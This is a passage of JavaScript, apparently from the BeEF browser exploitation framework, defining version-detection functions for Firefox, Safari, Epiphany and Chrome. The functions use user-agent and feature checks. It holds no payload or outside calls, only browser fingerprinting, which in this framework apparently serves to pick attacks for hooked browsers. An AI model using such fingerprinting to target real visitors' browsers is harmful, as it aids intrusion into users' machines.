        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/74./) != null;
    },

    /**
     * Returns true if FF75
     * @example: beef.browser.isFF75()
     */
    isFF75: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/75./) != null;
    },

    /**
     * Returns true if FF76
     * @example: beef.browser.isFF76()
     */
    isFF76: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/76./) != null;
    },

    /**
     * Returns true if FF77
     * @example: beef.browser.isFF77()
     */
    isFF77: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/77./) != null;
    },

    /**
     * Returns true if FF78
     * @example: beef.browser.isFF78()
     */
    isFF78: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/78./) != null;
    },

    /**
     * Returns true if FF79
     * @example: beef.browser.isFF79()
     */
    isFF79: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/79./) != null;
    },

    /**
     * Returns true if FF80
     * @example: beef.browser.isFF80()
     */
    isFF80: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/80./) != null;
    },

    /**
     * Returns true if FF81
     * @example: beef.browser.isFF81()
     */
    isFF81: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/81./) != null;
    },

    /**
     * Returns true if FF82
     * @example: beef.browser.isFF82()
     */
    isFF82: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/82./) != null;
    },

    /**
     * Returns true if FF83
     * @example: beef.browser.isFF83()
     */
    isFF83: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/83./) != null;
    },

    /**
     * Returns true if FF84
     * @example: beef.browser.isFF84()
     */
    isFF84: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/84./) != null;
    },

    /**
     * Returns true if FF85
     * @example: beef.browser.isFF85()
     */
    isFF85: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/85./) != null;
    },

    /**
     * Returns true if FF86
     * @example: beef.browser.isFF86()
     */
    isFF86: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/86./) != null;
    },

    /**
     * Returns true if FF87
     * @example: beef.browser.isFF87()
     */
    isFF87: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/87./) != null;
    },

    /**
     * Returns true if FF88
     * @example: beef.browser.isFF88()
     */
    isFF88: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && typeof navigator.mozGetUserMedia != "undefined" && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/88./) != null;
    },

    /**
     * Returns true if FF89
     * @example: beef.browser.isFF89()
     */
    isFF89: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/89./) != null;
    },

    /**
     * Returns true if FF90
     * @example: beef.browser.isFF90()
     */
    isFF90: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/90./) != null;
    },

    /**
     * Returns true if FF91
     * @example: beef.browser.isFF91()
     */
    isFF91: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/91./) != null;
    },

    /**
     * Returns true if FF92
     * @example: beef.browser.isFF92()
     */
    isFF92: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/92./) != null;
    },

    /**
     * Returns true if FF93
     * @example: beef.browser.isFF93()
     */
    isFF93: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/93./) != null;
    },

    /**
     * Returns true if FF94
     * @example: beef.browser.isFF94()
     */
    isFF94: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/94./) != null;
    },

    /**
     * Returns true if FF95
     * @example: beef.browser.isFF95()
     */
    isFF95: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/95./) != null;
    },

    /**
     * Returns true if FF96
     * @example: beef.browser.isFF96()
     */
    isFF96: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/96./) != null;
    },

    /**
     * Returns true if FF97
     * @example: beef.browser.isFF97()
     */
    isFF97: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/97./) != null;
    },

    /**
     * Returns true if FF98
     * @example: beef.browser.isFF98()
     */
    isFF98: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/98./) != null;
    },

    /**
     * Returns true if FF99
     * @example: beef.browser.isFF99()
     */
    isFF99: function () {
        return !!window.devicePixelRatio && !!window.history.replaceState && (this.getProtocol() == "https:" ? typeof navigator.mozGetUserMedia != "undefined" : true) && (typeof window.crypto != "undefined" && typeof window.crypto.getRandomValues != "undefined") && typeof Math.hypot == 'function' && typeof String.prototype.codePointAt === 'function' && typeof Number.isSafeInteger === 'function' && window.navigator.userAgent.match(/Firefox\/99./) != null;
    }, 

    /**
     * Returns true if the browser is any version of Firefox.
     * @example: beef.browser.isFFbowser()
    */
    isFFbowser: function () {
        const parser = bowser.getParser(navigator.userAgent);
        const browserName = parser.getBrowserName();
        return browserName == 'Firefox';
    },

    /**
     * Returns true if the browser is any version of Firefox.
     * @example: beef.browser.isFF()
     */
    isFF: function () {
        var legacyCheck = this.isFF2() || this.isFF3() || this.isFF3_5() || this.isFF3_6() || this.isFF4() || this.isFF5() || this.isFF6() || this.isFF7() || this.isFF8() || this.isFF9() || this.isFF10() || this.isFF11() || this.isFF12() || this.isFF13() || this.isFF14() || this.isFF15() || this.isFF16() || this.isFF17() || this.isFF18() || this.isFF19() || this.isFF20() || this.isFF21() || this.isFF22() || this.isFF23() || this.isFF24() || this.isFF25() || this.isFF26() || this.isFF27() || this.isFF28() || this.isFF29() || this.isFF30() || this.isFF31() || this.isFF32() || this.isFF33() || this.isFF34() || this.isFF35() || this.isFF36() || this.isFF37() || this.isFF38() || this.isFF39() || this.isFF40() || this.isFF41() || this.isFF42() || this.isFF43() || this.isFF44() || this.isFF45() || this.isFF46() || this.isFF47() || this.isFF48() || this.isFF49() || this.isFF50() || this.isFF51() || this.isFF52() || this.isFF53() || this.isFF54() || this.isFF55() || this.isFF56() || this.isFF57() || this.isFF58()|| this.isFF59() || this.isFF60() || this.isFF61() || this.isFF62() || this.isFF63() || this.isFF64() || this.isFF65() || this.isFF66() || this.isFF67() || this.isFF68() || this.isFF69() || this.isFF70() || this.isFF71() || this.isFF72() || this.isFF73() || this.isFF74() || this.isFF75() || this.isFF76() || this.isFF77() || this.isFF78() || this.isFF79() || this.isFF80() || this.isFF81() || this.isFF82() || this.isFF83() || this.isFF84() || this.isFF85() || this.isFF86() || this.isFF87() || this.isFF88() || this.isFF89() || this.isFF90() || this.isFF91() || this.isFF92() || this.isFF93() || this.isFF94() || this.isFF95() || this.isFF96() || this.isFF97() || this.isFF98() || this.isFF99();
        return legacyCheck || this.isFFbowser();
    },

    /**
     * Returns true if Safari 4.xx
     * @example: beef.browser.isS4()
     */
    isS4: function () {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/4/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 5.xx
     * @example: beef.browser.isS5()
     */
    isS5: function () {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/5/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 6.xx
     * @example: beef.browser.isS6()
     */
    isS6: function () {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/6/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 7.xx
     * @example: beef.browser.isS7()
     */
    isS7: function () {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/7/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari 8.xx
     * @example: beef.browser.isS8()
     */
    isS8: function () {
        return (window.navigator.userAgent.match(/ Version\/\d/) != null && window.navigator.userAgent.match(/Safari\/8/) != null && !window.globalStorage && !!window.getComputedStyle && !window.opera && !window.chrome && !("MozWebSocket" in window));
    },

    /**
     * Returns true if Safari.
     * @example: beef.browser.isS()
     */
    isS: function () {
        return this.isS4() || this.isS5() || this.isS6() || this.isS7() || this.isS8();
    },

    /**
     * Returns true if Webkit based
     */


    isWebKitBased: function () {
        /*
        * **** DUPLICATE WARNING **** Changes here may aldo need addressed in /isS\d+/ functions.
        */
        return (!window.opera && !window.chrome
                && window.navigator.userAgent.match(/ Version\/\d/) != null
                && !window.globalStorage
                && !!window.getComputedStyle
                && !("MozWebSocket" in window));
    },

    /**
     * Return true if Epiphany
     * @example: beef.browser.isEpi()
     */
    isEpi: function () {
        // Epiphany is based on webkit
        // due to the uncertainty of webkit version vs Epiphany versions tracking.
        // -- do webkit based checking (i.e. do safari checks)
        return this.isWebKitBased() &&  window.navigator.userAgent.match(/Epiphany\//) != null;
    },


    /**
     * Returns true if Chrome 5.
     * @example: beef.browser.isC5()
     */
    isC5: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 5) ? true : false);
    },

    /**
     * Returns true if Chrome 6.
     * @example: beef.browser.isC6()
     */
    isC6: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 6) ? true : false);
    },

    /**
     * Returns true if Chrome 7.
     * @example: beef.browser.isC7()
     */
    isC7: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 7) ? true : false);
    },

    /**
     * Returns true if Chrome 8.
     * @example: beef.browser.isC8()
     */
    isC8: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 8) ? true : false);
    },

    /**
     * Returns true if Chrome 9.
     * @example: beef.browser.isC9()
     */
    isC9: function () {
        return (!!window.chrome && !!window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 9) ? true : false);
    },

    /**
     * Returns true if Chrome 10.
     * @example: beef.browser.isC10()
     */
    isC10: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 10) ? true : false);
    },

    /**
     * Returns true if Chrome 11.
     * @example: beef.browser.isC11()
     */
    isC11: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 11) ? true : false);
    },

    /**
     * Returns true if Chrome 12.
     * @example: beef.browser.isC12()
     */
    isC12: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 12) ? true : false);
    },

    /**
     * Returns true if Chrome 13.
     * @example: beef.browser.isC13()
     */
    isC13: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 13) ? true : false);
    },

    /**
     * Returns true if Chrome 14.
     * @example: beef.browser.isC14()
     */
    isC14: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 14) ? true : false);
    },

    /**
     * Returns true if Chrome 15.
     * @example: beef.browser.isC15()
     */
    isC15: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 15) ? true : false);
    },

    /**
     * Returns true if Chrome 16.
     * @example: beef.browser.isC16()
     */
    isC16: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 16) ? true : false);
    },

    /**
     * Returns true if Chrome 17.
     * @example: beef.browser.isC17()
     */
    isC17: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 17) ? true : false);
    },

    /**
     * Returns true if Chrome 18.
     * @example: beef.browser.isC18()
     */
    isC18: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 18) ? true : false);
    },

    /**
     * Returns true if Chrome 19.
     * @example: beef.browser.isC19()
     */
    isC19: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 19) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 19.
     * @example: beef.browser.isC19iOS()
     */
    isC19iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 19) ? true : false);
    },

    /**
     * Returns true if Chrome 20.
     * @example: beef.browser.isC20()
     */
    isC20: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 20) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 20.
     * @example: beef.browser.isC20iOS()
     */
    isC20iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 20) ? true : false);
    },

    /**
     * Returns true if Chrome 21.
     * @example: beef.browser.isC21()
     */
    isC21: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 21) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 21.
     * @example: beef.browser.isC21iOS()
     */
    isC21iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 21) ? true : false);
    },

    /**
     * Returns true if Chrome 22.
     * @example: beef.browser.isC22()
     */
    isC22: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 22) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 22.
     * @example: beef.browser.isC22iOS()
     */
    isC22iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 22) ? true : false);
    },

    /**
     * Returns true if Chrome 23.
     * @example: beef.browser.isC23()
     */
    isC23: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 23) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 23.
     * @example: beef.browser.isC23iOS()
     */
    isC23iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 23) ? true : false);
    },

    /**
     * Returns true if Chrome 24.
     * @example: beef.browser.isC24()
     */
    isC24: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 24) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 24.
     * @example: beef.browser.isC24iOS()
     */
    isC24iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 24) ? true : false);
    },

    /**
     * Returns true if Chrome 25.
     * @example: beef.browser.isC25()
     */
    isC25: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 25) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 25.
     * @example: beef.browser.isC25iOS()
     */
    isC25iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 25) ? true : false);
    },

    /**
     * Returns true if Chrome 26.
     * @example: beef.browser.isC26()
     */
    isC26: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 26) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 26.
     * @example: beef.browser.isC26iOS()
     */
    isC26iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 26) ? true : false);
    },

    /**
     * Returns true if Chrome 27.
     * @example: beef.browser.isC27()
     */
    isC27: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 27) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 27.
     * @example: beef.browser.isC27iOS()
     */
    isC27iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 27) ? true : false);
    },

    /**
     * Returns true if Chrome 28.
     * @example: beef.browser.isC28()
     */
    isC28: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 28) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 28.
     * @example: beef.browser.isC28iOS()
     */
    isC28iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 28) ? true : false);
    },

    /**
     * Returns true if Chrome 29.
     * @example: beef.browser.isC29()
     */
    isC29: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 29) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 29.
     * @example: beef.browser.isC29iOS()
     */
    isC29iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 29) ? true : false);
    },

    /**
     * Returns true if Chrome 30.
     * @example: beef.browser.isC30()
     */
    isC30: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 30) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 30.
     * @example: beef.browser.isC30iOS()
     */
    isC30iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 30) ? true : false);
    },

    /**
     * Returns true if Chrome 31.
     * @example: beef.browser.isC31()
     */
    isC31: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 31) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 31.
     * @example: beef.browser.isC31iOS()
     */
    isC31iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 31) ? true : false);
    },

    /**
     * Returns true if Chrome 32.
     * @example: beef.browser.isC32()
     */
    isC32: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 32) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 32.
     * @example: beef.browser.isC32iOS()
     */
    isC32iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 32) ? true : false);
    },

    /**
     * Returns true if Chrome 33.
     * @example: beef.browser.isC33()
     */
    isC33: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 33) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 33.
     * @example: beef.browser.isC33iOS()
     */
    isC33iOS: function () {
        return (!window.webkitPerformance && window.navigator.appVersion.match(/CriOS\/(\d+)\./) != null) && ((parseInt(window.navigator.appVersion.match(/CriOS\/(\d+)\./)[1], 10) == 33) ? true : false);
    },

    /**
     * Returns true if Chrome 34.
     * @example: beef.browser.isC34()
     */
    isC34: function () {
        return (!!window.chrome && !window.webkitPerformance && window.navigator.appVersion.match(/Chrome\/(\d+)\./)) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10) == 34) ? true : false);
    },

    /**
     * Returns true if Chrome for iOS 34.
     * @example: beef.browser.isC34iOS()
     */
